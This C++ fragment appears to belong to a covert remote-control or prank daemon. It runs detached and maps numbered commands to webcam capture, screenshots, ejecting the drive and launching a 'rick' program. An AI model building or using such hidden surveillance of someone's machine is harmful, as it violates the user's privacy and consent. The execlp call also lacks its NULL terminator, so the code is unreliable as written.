#include "utility.h"

void execute(const std::string &command)
{
  if(command == "webcam")
  {
    system(command_webcam.c_str());
  }
  if(command == "eject")
  {
    system(command_eject.c_str());
  }
  if(command == "rick")
  {
    if(fork() == 0)
    {
      execlp(command_rick0.c_str(),command_rick0.c_str(),command_rick1.c_str());
    }
  }
  if(command == "screen")
  {
    system(command_screenshot.c_str());
  }
}
std::string commandMap(int input)
{
	std::string command = "";

	switch(input)
	{
		case 1:
			command = "eject";
			break;
		case 2:
			command = "webcam";
			break;
		case 3:
			command = "rick";
			break;
		case 4:
			command = "screen";
			break;
	}
	return command;
}
void daemonize()
{
	struct sigaction sa;

	if(fork() != 0)
		exit(0);
	setsid();

	sa.sa_handler = SIG_IGN;
	sigemptyset(&sa.sa_mask);
	sa.sa_flags = 0;
	sigaction(SIGHUP,&sa,NULL);

	if(fork() != 0)
		exit(0);
	chdir("/");

	for(int i = 0; i < 1024; i++)
		close(i);

	open("/dev/null",O_RDWR);
	dup(0);
	dup(0);
}
